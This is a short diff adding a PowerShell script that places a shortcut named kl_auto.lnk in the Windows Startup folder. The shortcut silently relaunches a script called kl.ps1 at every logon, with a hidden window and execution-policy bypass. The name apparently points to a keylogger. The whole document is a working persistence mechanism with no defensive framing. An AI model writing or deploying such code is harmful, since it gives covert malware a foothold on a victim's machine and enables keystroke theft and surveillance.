@@ -1,0 +1,7 @@
+$WshShell = New-Object -ComObject WScript.Shell
+$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kl_auto.lnk"
+$Shortcut = $WshShell.CreateShortcut($StartupPath)
+
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$HOME\Documents\kl.ps1`""
+$Shortcut.Save()
